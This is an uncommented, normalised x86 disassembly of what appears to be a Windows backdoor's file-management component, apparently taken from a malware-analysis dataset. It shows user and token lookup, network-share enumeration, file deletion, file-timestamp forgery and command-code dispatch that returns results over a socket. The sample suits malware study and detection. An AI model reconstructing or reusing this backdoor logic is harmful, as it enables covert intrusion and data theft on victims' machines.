push eax
lea eax [ ebp - 0x744 ]
push eax
call strcpy
lea eax [ ebp - 0x744 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call strcpy
add esp 0x20
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x444 ]
push eax
call [ GetUserNameA@IAT ]
lea eax [ ebp - 0x444 ]
push eax
push esi
call sub_4047b6
pop ecx
test eax eax
pop ecx
jne r-xdata
lea eax [ ebp - 0x644 ]
push 0x200
push eax
push [ ebp - 0x14 ]
push esi
call [ ebp - 0x10 ]
lea eax [ ebp - 0x644 ]
push eax
call sub_403547
pop ecx
lea eax [ ebp - 0x344 ]
push rw-data
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x344 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x644 ]
push rw-data
push eax
call strcpy
add esp 0x10
push esi
call [ rw-data ]
lea eax [ ebp - 0x444 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
lea eax [ ebp - 0x344 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x644 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call strcat
lea eax [ ebp - 0x344 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x344 ]
push eax
lea eax [ ebp + ebx - 0x2744 ]
push eax
call strcpy
lea eax [ ebp - 0x344 ]
push eax
call strlen
lea esi [ ebx + eax + 0x1 ]
mov eax [ ebp - 0x13c ]
mov [ ebp + esi - 0x2744 ] eax
add esi 0x4
lea eax [ ebp - 0x444 ]
push eax
lea eax [ ebp + esi - 0x2744 ]
push eax
call strcpy
lea eax [ ebp - 0x444 ]
push eax
call strlen
lea ebx [ esi + eax + 0x1 ]
mov eax [ ebp - 0x130 ]
add esp 0x30
mov [ ebp + ebx - 0x2744 ] eax
lea eax [ ebp - 0x144 ]
push eax
add ebx 0x4
push [ ebp - 0x8 ]
call [ rw-data ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x644 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call strcpy
pop ecx
pop ecx
push [ ebp - 0x13c ]
push 0x0
push edi
call [ rw-data ]
mov esi eax
push esi
call [ GetPriorityClass@IAT ]
push esi
call [ rw-data ]
cmp [ rw-data ] 0x2
jne r-xdata
pop edi
sub_4038f9
push esi
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push 0x1
mov esi eax
push [ esp + 0xc ]
call sub_4033fc
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
pop esi
retn
push 0x1
push eax
call esi
pop esi
retn
sub_40394e
push esi
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push [ esp + 0x8 ]
mov esi eax
push 0x0
push 0x1
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
push 0x1
push eax
call esi
pop esi
retn
sub_4039c2
push ebp
mov ebp esp
sub esp 0x400
push esi
lea eax [ ebp - 0x400 ]
push [ rw-data ]
push eax
call strcpy
lea eax [ ebp - 0x400 ]
push eax
call strlen
add esp 0xc
mov esi eax
mov [ rw-data ] 0x4f
call sub_403edc
pop esi
leave
retn
lea eax [ ebp - 0x400 ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call strcpy
mov eax [ rw-data ]
add eax esi
push eax
lea eax [ ebp - 0x200 ]
push eax
call strcat
mov eax [ rw-data ]
add eax esi
push eax
call strlen
add esp 0x14
lea esi [ esi + eax + 0x1 ]
lea eax [ ebp - 0x200 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax + esi ] 0x30
jne r-xdata
lea eax [ ebp - 0x200 ]
push 0x4c
push eax
call sub_403f01
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x200 ]
push eax
call [ rw-data ]
jmp r-xdata
inc esi
cmp esi [ rw-data ]
jge r-xdata
sub_403a7d
mov eax [ rw-data ]
push esi
push eax
mov esi eax
call strlen
mov ecx [ rw-data ]
lea eax [ eax + ecx + 0x1 ]
push eax
push esi
call [ rename@IAT ]
add esp 0xc
neg eax
sbb al al
and al 0xf6
add al 0x4f
mov [ rw-data ] al
call sub_403edc
pop esi
retn
sub_403ab4
push ebp
mov ebp esp
push ecx
push ebx
push [ rw-data ]
call strlen
mov ecx [ rw-data ]
push ecx
mov bl [ eax + ecx + 0x1 ]
call strlen
mov ecx [ rw-data ]
push ecx
mov al [ eax + ecx + 0x2 ]
mov [ ebp - 0x1 ] al
call strlen
mov ecx [ rw-data ]
add esp 0xc
mov al [ eax + ecx + 0x3 ]
push ecx
mov [ ebp - 0x2 ] al
call [ GetFileAttributesA@IAT ]
cmp bl 0x31
pop ebx
jne r-xdata
and al 0xfe
or al 0x1
jmp r-xdata
and al 0xfd
or al 0x2
jmp r-xdata
cmp [ ebp - 0x1 ] 0x31
jne r-xdata
and al 0xfb
or al 0x4
jmp r-xdata
cmp [ ebp - 0x2 ] 0x31
jne r-xdata
push eax
push [ rw-data ]
call [ SetFileAttributesA@IAT ]
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_403edc
leave
retn
sub_403b63
xor eax eax
push eax
push 0x2
push 0x2
push eax
push eax
push 0x40000000
push [ rw-data ]
call [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov [ rw-data ] 0x45
push eax
call [ rw-data ]
mov [ rw-data ] 0x4f
jmp r-xdata
jmp sub_403edc
sub_403b9e
push ebp
mov ebp esp
sub esp 0x214
push ebx
push esi
push edi
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push [ rw-data ]
push eax
call memcpy
mov esi [ strrchr@IAT ]
push 0x5c
push [ rw-data ]
call esi
push eax
call sub_403de0
lea eax [ ebp - 0x214 ]
push 0x5c
push eax
call esi
add esp 0x20
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push rw-data
push eax
call strcat
push 0x7d00
mov [ ebp - 0x14 ] 0x42
call [ malloc@IAT ]
mov edi eax
add esp 0xc
test edi edi
je r-xdata
and [ eax + 0x1 ] 0x0
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x214 ]
push eax
call sub_403d74
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
push edi
call [ free@IAT ]
pop ecx
test esi esi
jne r-xdata
lea eax [ esi + esi * 4 ]
push 0x5
shl eax 0x6
add eax 0x5
mov [ ebp - 0x13 ] eax
lea eax [ ebp - 0x14 ]
push eax
call sub_4077bf
pop ecx
lea eax [ ebp - 0x214 ]
pop ecx
push edi
push eax
call [ rw-data ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
jne r-xdata
push 0x1
pop esi
push edi
call sub_403e2d
test eax eax
pop ecx
je r-xdata
lea eax [ edi + 0x2c ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x8 ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_402974
push ebx
push edi
call sub_402833
push edi
call [ free@IAT ]
add esp 0x24
jmp r-xdata
and [ ebp - 0x8 ] 0x0
lea ebx [ esi - 0x1 ]
test ebx ebx
jle r-xdata
lea eax [ ebp - 0xc ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_402974
push ebx
push edi
call sub_402833
add esp 0x18
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
push edi
push [ ebp - 0x4 ]
call sub_403d31
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
push edi
call [ free@IAT ]
pop ecx
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
add [ ebp - 0x8 ] eax
lea esi [ eax + eax * 4 ]
lea eax [ ebp - 0xc ]
shl esi 0x6
push eax
push edi
push esi
push edi
call sub_402974
push esi
push edi
call sub_402833
add esp 0x18
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] ebx
jl r-xdata
sub_403d31
push esi
mov esi [ esp + 0xc ]
push edi
xor edi edi
mov eax edi
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push esi
call sub_403e2d
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
retn
cmp edi 0x64
jge r-xdata
inc edi
add esi 0x140
jmp r-xdata
push esi
push [ esp + 0x10 ]
call [ rw-data ]
test eax eax
je r-xdata
sub_403d74
push ebp
mov ebp esp
sub esp 0x140
push esi
lea eax [ ebp - 0x140 ]
push edi
push eax
push [ ebp + 0x8 ]
xor edi edi
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax edi
lea eax [ ebp - 0x140 ]
push eax
call sub_403e2d
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
inc edi
push esi
call [ FindClose@IAT ]
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x140 ]
push eax
push esi
call [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push esi
call [ FindClose@IAT ]
jmp r-xdata
sub_403de0
and [ rw-data ] 0x0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push edi
push edi
call strlen
cmp eax 0x2
pop ecx
jb r-xdata
and [ esi ] 0x0
test esi esi
jne r-xdata
mov eax [ rw-data ]
inc [ rw-data ]
mov [ eax * 4 + rw-data ] edi
lea edi [ esi + 0x1 ]
push 0x3b
push edi
call [ strchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop edi
sub_403e2d
push ecx
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
test [ edi ] 0x10
jne r-xdata
push 0x1
pop eax
jmp r-xdata
add edi 0x2c
push 0x2e
push edi
call [ strrchr@IAT ]
and [ esp + 0x20 ] 0x0
cmp [ rw-data ] 0x0
pop ecx
mov [ esp + 0x14 ] eax
pop ecx
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
xor eax eax
mov ebx [ lstrcmpiA@IAT ]
mov esi rw-data
inc [ esp + 0x18 ]
add esi 0x4
mov eax [ esp + 0x18 ]
cmp eax [ rw-data ]
jl r-xdata
push rw-data
push [ esi ]
call ebx
test eax eax
je r-xdata
push [ esi ]
call strlen
cmp eax 0x2
pop ecx
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
push rw-data
push [ esi ]
mov eax [ esi ]
inc eax
inc eax
push eax
call strlen
mov ebp eax
pop ecx
test ebp ebp
je r-xdata
push edi
call strlen
pop ecx
sub eax ebp
mov ecx [ esi ]
inc ecx
inc ecx
add eax edi
push ecx
push eax
jmp r-xdata
call ebx
test eax eax
je r-xdata
sub_403edc
push ebp
mov ebp esp
push ecx
push ecx
mov al [ rw-data ]
push 0x6
mov [ ebp - 0x3 ] al
pop eax
mov [ ebp - 0x7 ] eax
push eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x52
push eax
call sub_4077bf
pop ecx
pop ecx
leave
retn
sub_403f01
push ebp
mov ebp esp
sub esp 0x844
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ sprintf@IAT ]
lea eax [ ebp - 0x844 ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x144 ]
push eax
lea eax [ ebp - 0x844 ]
push eax
call [ rw-data ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x4c
jne r-xdata
mov edi [ WaitForSingleObject@IAT ]
mov ebx 0x102
push 0x1
pop eax
push [ ebp + 0x8 ]
call [ RemoveDirectoryA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
cmp [ ebp - 0x118 ] 0x2e
je r-xdata
lea eax [ ebp - 0x144 ]
push eax
push [ ebp - 0x4 ]
call [ rw-data ]
test eax eax
je r-xdata
lea eax [ ebp - 0x118 ]
push eax
lea eax [ ebp - 0x444 ]
push eax
call strcpy
pop ecx
lea eax [ ebp - 0x444 ]
test [ ebp - 0x144 ] 0x10
pop ecx
push eax
push [ ebp + 0x8 ]
push rw-data
je r-xdata
lea eax [ ebp - 0x344 ]
push eax
call esi
add esp 0x10
cmp [ ebp + 0xc ] 0x4c
je r-xdata
lea eax [ ebp - 0x644 ]
push eax
call esi
add esp 0x10
cmp [ ebp + 0xc ] 0x4e
jl r-xdata
lea eax [ ebp - 0x344 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x4d
jle r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x644 ]
push eax
call sub_403f01
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ ebp + 0xc ] 0x4f
jg r-xdata
lea eax [ ebp - 0x344 ]
push eax
call [ rw-data ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x4f
jle r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x644 ]
push 0x46
push eax
call sub_404159
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x344 ]
push 0x44
push eax
call sub_404159
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ ebp + 0xc ] 0x59
jne r-xdata
push 0xea60
push [ rw-data ]
call edi
cmp eax ebx
je r-xdata
push 0xea60
push [ rw-data ]
call edi
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x144 ]
push eax
call sub_403e2d
test eax eax
pop ecx
je r-xdata
cmp [ ebp + 0xc ] 0x4f
jne r-xdata
lea eax [ ebp - 0x144 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call sub_4043e8
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x344 ]
push eax
push 0x0
call sub_4041a1
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp - 0x12c ]
lea eax [ ebp - 0x344 ]
push [ ebp - 0x130 ]
push eax
call sub_404472
add esp 0xc
test eax eax
je r-xdata
push 0xea60
push [ rw-data ]
call edi
cmp eax ebx
je r-xdata
cmp [ ebp + 0xc ] 0x4f
jne r-xdata
lea eax [ ebp - 0x344 ]
push 0x0
push eax
call [ rw-data ]
sub_404159
push ebp
mov ebp esp
sub esp 0x400
push esi
push [ ebp + 0x8 ]
call strlen
push [ ebp + 0x8 ]
mov esi eax
mov al [ ebp + 0xc ]
add esi 0x6
mov [ ebp - 0x400 ] al
lea eax [ ebp - 0x3fb ]
push eax
mov [ ebp - 0x3ff ] esi
call strcpy
lea eax [ ebp - 0x400 ]
push esi
push eax
call sub_4077bf
add esp 0x14
pop esi
leave
retn
sub_4041a1
push ebp
mov ebp esp
mov eax 0x2008
call sub_407dc0
mov eax [ rw-data ]
push ebx
push esi
push edi
push 0x1
cmp eax 0x53
pop ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x2008 ] 0x53
cmp eax 0x59
sete al
dec eax
and al 0xec
add eax 0x59
mov [ ebp - 0x2008 ] al
jmp r-xdata
push edi
push esi
call [ GetFileSize@IAT ]
push 0x5
pop ecx
sub ecx [ ebp + 0x8 ]
push esi
add eax ecx
mov [ ebp - 0x2007 ] eax
call [ rw-data ]
lea eax [ ebp - 0x2008 ]
push 0x5
push eax
call sub_4077bf
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp - 0x2008 ] 0x59
jne r-xdata
xor edi edi
push edi
push 0x80
push 0x3
push edi
push 0x3
push 0x80000000
push [ ebp + 0xc ]
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call [ fopen@IAT ]
push edi
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
push eax
call [ fseek@IAT ]
add esp 0x14
cmp [ rw-data ] edi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rw-data ] 0x55
call sub_403edc
jmp r-xdata
push 0x6
pop eax
mov [ ebp - 0x2007 ] eax
push eax
lea eax [ ebp - 0x2008 ]
push eax
call sub_4077bf
pop ecx
mov eax ebx
pop ecx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov esi 0x2000
pop edi
pop esi
pop ebx
leave
retn
cmp ebx esi
jne r-xdata
cmp [ rw-data ] 0x41
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
push [ ebp - 0x8 ]
call [ fclose@IAT ]
mov eax [ ebp - 0x4 ]
pop ecx
push [ ebp - 0x8 ]
call [ fclose@IAT ]
pop ecx
push edi
push [ ebp + 0xc ]
call [ rw-data ]
push [ ebp + 0xc ]
call [ rw-data ]
push 0x1
pop eax
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x2008 ]
push esi
push 0x1
push eax
call [ fread@IAT ]
mov ebx eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x2008 ]
push eax
lea eax [ ebp - 0x2008 ]
push esi
push eax
call sub_402974
lea eax [ ebp - 0x2008 ]
push ebx
push eax
call sub_402833
add esp 0x28
test eax eax
je r-xdata
sub_404338
push 0x46
push [ rw-data ]
call sub_404159
pop ecx
pop ecx
push 0xea60
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
retn
push [ esp + 0x4 ]
push [ rw-data ]
call sub_403f01
pop ecx
mov [ rw-data ] 0x47
pop ecx
jmp sub_403edc
sub_40437d
push esi
push edi
push 0x0
mov esi rw-data
push 0x26
push esi
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
push rw-data
push esi
push rw-data
push esi
call [ sprintf@IAT ]
add esp 0x10
push esi
call [ rw-data ]
push 0x5c
push [ rw-data ]
call [ strrchr@IAT ]
mov edi eax
push edi
call sub_403de0
and [ edi ] 0x0
push 0x59
push [ rw-data ]
call sub_403f01
push esi
push 0x0
call sub_4041a1
add esp 0x1c
push esi
call [ rw-data ]
pop edi
pop esi
retn
sub_4043e8
push ebx
push rw-data
push rw-data
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
pop ebx
retn
push esi
push edi
push ebx
push [ esp + 0x14 ]
call strlen
mov esi [ fwrite@IAT ]
pop ecx
inc eax
push eax
push 0x1
push [ esp + 0x1c ]
call esi
mov edi [ esp + 0x24 ]
push ebx
push 0x8
push 0x1
lea eax [ edi + 0x14 ]
push eax
call esi
push ebx
push 0x4
add edi 0x20
push 0x1
push edi
call esi
push ebx
call [ fclose@IAT ]
add esp 0x34
pop edi
pop esi
sub_404472
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x2e
push [ ebp + 0x8 ]
call [ strrchr@IAT ]
mov edi [ lstrcmpiA@IAT ]
pop ecx
pop ecx
mov ebx eax
mov esi rw-data
xor eax eax
test ebx ebx
je r-xdata
push rw-data
push esi
lea eax [ esi + 0x2 ]
push eax
lea eax [ ebx + 0x1 ]
push eax
jmp r-xdata
xor edi edi
push edi
push 0x80
push 0x3
push edi
push 0x3
push 0x80000000
push [ ebp + 0x8 ]
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
add esi 0x10
cmp esi rw-data
jl r-xdata
call edi
test eax eax
je r-xdata
push edi
push esi
call [ GetFileSize@IAT ]
push esi
mov edi eax
call [ rw-data ]
cmp edi 0x7d0
jb r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp edi 0xf4240
ja r-xdata
push rw-data
push [ ebp + 0x8 ]
call [ strstr@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ SystemTimeToFileTime@IAT ]
add [ ebp - 0x8 ] 0xd8a14000
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0xc ]
push eax
adc [ ebp - 0x4 ] 0xfffff5c8
call [ CompareFileTime@IAT ]
xor ecx ecx
test eax eax
setge cl
mov eax ecx
jmp r-xdata
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_404565
push ebp
mov ebp esp
sub esp 0x10c
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi rw-data
push rw-data
push esi
call [ fopen@IAT ]
mov ebx eax
pop ecx
cmp ebx edi
pop ecx
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1
add eax 0x4
push eax
call strlen
cmp eax 0x114
pop ecx
mov [ ebp - 0x8 ] eax
jae r-xdata
mov edi [ rw-data ]
mov eax [ rw-data ]
push edi
call [ fclose@IAT ]
pop ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov esi rw-data
add eax 0x4
push eax
push esi
call strcpy
mov eax [ rw-data ]
pop ecx
cmp eax 0x56
pop ecx
je r-xdata
cmp [ rw-data ] 0x5e
jne r-xdata
push edi
lea eax [ ebp - 0x10c ]
push 0x15
push eax
push edi
call [ SHGetSpecialFolderPathA@IAT ]
lea eax [ ebp - 0x10c ]
push esi
push eax
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x10c ]
push eax
push esi
call strcpy
add esp 0x18
cmp eax 0x5e
jne r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x4f
call sub_403edc
cmp [ rw-data ] 0x56
jne r-xdata
mov edi rw-data
push edi
call [ rw-data ]
push edi
push esi
call [ rename@IAT ]
jmp r-xdata
push rw-data
push rw-data
jmp r-xdata
push edi
push esi
call [ rw-data ]
mov eax [ rw-data ]
cmp [ eax ] edi
je r-xdata
push esi
call sub_404704
push esi
call sub_405082
pop ecx
pop ecx
mov [ rw-data ] 0x45
call sub_403edc
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x8 ]
lea edi [ eax + ecx + 0x5 ]
mov eax [ rw-data ]
sub eax ecx
sub eax 0x5
jmp r-xdata
push esi
call [ fopen@IAT ]
mov ebx eax
pop ecx
cmp ebx edi
pop ecx
je r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
push ecx
push edi
push eax
push edi
call sub_402974
push ebx
push [ ebp - 0x4 ]
push 0x1
push edi
call [ fwrite@IAT ]
push ebx
call [ fclose@IAT ]
add esp 0x24
cmp [ rw-data ] 0x0
je r-xdata
sub_404704
push ebp
mov ebp esp
sub esp 0x10c
push ebx
push esi
push edi
lea eax [ ebp - 0x10c ]
push 0x104
push eax
call [ rw-data ]
xor esi esi
lea eax [ ebp - 0x10c ]
push esi
push 0x2000000
push 0x3
push esi
push 0x5
push 0x80000000
push eax
call [ rw-data ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push 0x80
push 0x3
push esi
push esi
push 0x40000000
push [ ebp + 0x8 ]
call [ rw-data ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push esi
lea eax [ ebp - 0x8 ]
push esi
push eax
push ebx
call [ GetFileTime@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push edi
call [ SetFileTime@IAT ]
push ebx
call [ rw-data ]
push edi
call [ rw-data ]
push [ ebp + 0x8 ]
call [ GetFileAttributesA@IAT ]
push eax
push [ ebp + 0x8 ]
call [ rw-data ]
push ebx
call [ rw-data ]
jmp r-xdata
sub_4047b6
push ebp
mov ebp esp
sub esp 0x4c0
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] 0x100
push eax
push 0x20008
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xc8
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4c0 ]
push 0x3e8
push eax
push 0x1
push [ ebp + 0x8 ]
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xd8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push [ ebp - 0x4c0 ]
push 0x0
call [ LookupAccountSidA@IAT ]
neg eax
sbb eax eax
neg eax
leave
retn
sub_404832
push ebp
mov ebp esp
mov eax 0x4244
call sub_407dc0
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
push rw-data
push edi
mov [ ebp - 0x4 ] eax
call esi
push edi
mov [ ebp - 0x1c ] eax
call [ FreeLibrary@IAT ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0x2
or [ ebp - 0x10 ] 0xffffffff
pop edi
mov [ ebp - 0x3c ] ebx
push rw-data
mov [ ebp - 0x40 ] edi
push [ rw-data ]
mov [ ebp - 0x38 ] 0x3
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x14 ] 0x4000
mov [ ebp - 0x8 ] 0x5
mov [ ebp - 0x4244 ] 0x47
call [ strstr@IAT ]
pop ecx
mov esi eax
pop ecx
cmp esi ebx
push 0x5c
je r-xdata
push [ rw-data ]
mov esi [ strrchr@IAT ]
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
lea eax [ esi + 0x3 ]
push eax
call [ strchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
mov [ ebp - 0x18 ] eax
je r-xdata
mov [ ebp - 0x8 ] 0x6
mov [ ebp - 0x423f ] bl
mov esi [ ebp - 0x8 ]
mov [ eax ] bl
mov ecx [ rw-data ]
cmp eax ecx
je r-xdata
inc eax
push 0x5c
push eax
call [ strchr@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ebx
push ebx
push edi
call [ ebp - 0x4 ]
test eax eax
jne r-xdata
push 0x5c
push ecx
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov eax [ ebp - 0x18 ]
inc esi
mov [ eax ] bl
mov [ ebp - 0x2c ] esi
jmp r-xdata
inc esi
push esi
push [ rw-data ]
call strcpy
pop ecx
pop ecx
call sub_403b9e
jmp r-xdata
push [ ebp - 0x14 ]
push 0x40
call [ GlobalAlloc@IAT ]
mov edi eax
mov [ ebp - 0x18 ] edi
cmp [ rw-data ] edi
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x2c ] ecx
jne r-xdata
push edi
call [ GlobalFree@IAT ]
push [ ebp - 0x20 ]
call WNetCloseEnum
mov esi [ ebp - 0x8 ]
cmp esi 0x5
jne r-xdata
cmp [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
jbe r-xdata
cmp eax [ rw-data ]
jne r-xdata
cmp eax [ rw-data ]
jne r-xdata
lea eax [ ebp - 0x44 ]
mov [ ebp - 0x4243 ] esi
push eax
lea eax [ ebp - 0x423f ]
push eax
lea eax [ esi - 0x5 ]
push eax
lea eax [ ebp - 0x423f ]
push eax
call sub_402974
lea eax [ ebp - 0x4244 ]
push esi
push eax
call sub_4077bf
add esp 0x18
push [ ebp - 0x14 ]
push ebx
push edi
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push edi
push eax
push [ ebp - 0x20 ]
call [ ebp - 0x1c ]
cmp eax ebx
jne r-xdata
lea esi [ edi + 0x14 ]
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x38 ] 0x6
mov [ ebp - 0x34 ] 0x80000002
mov [ ebp - 0x24 ] ecx
jmp r-xdata
inc [ ebp - 0x4 ]
add esi 0x20
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
cmp [ esi - 0x10 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp eax ebx
je r-xdata
jmp r-xdata
mov edi [ ebp - 0x8 ]
push [ esi ]
lea eax [ ebp + edi - 0x4244 ]
push eax
call strcpy
push [ esi ]
call strlen
add esp 0xc
add edi eax
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x2
push 0x5c
push eax
call [ strchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov eax [ esi - 0xc ]
inc edi
mov [ ebp + edi - 0x4244 ] eax
add edi 0x4
mov [ ebp - 0x8 ] edi
mov edi [ ebp - 0x18 ]
lea eax [ ebp - 0x244 ]
push eax
push [ esi ]
call sub_404af2
lea eax [ ebp - 0x244 ]
push eax
lea eax [ ebp + edi - 0x4244 ]
push eax
call strcpy
lea eax [ ebp - 0x244 ]
push eax
call strlen
add esp 0x14
add edi eax
inc eax
mov [ esi ] eax
sub_404af2
cmp [ rw-data ] 0x1
push [ esp + 0x8 ]
jne r-xdata
push [ esp + 0x8 ]
call sub_404b1a
mov eax [ esp + 0x8 ]
add eax 0x2
push eax
call sub_404d4d
jmp r-xdata
pop ecx
pop ecx
retn
sub_404b1a
push ebp
mov ebp esp
sub esp 0x448
mov eax [ ebp + 0x8 ]
push ebx
push esi
add eax 0x2
push edi
push eax
call [ Ordinal_WSOCK32_52@IAT ]
mov esi [ sprintf@IAT ]
test eax eax
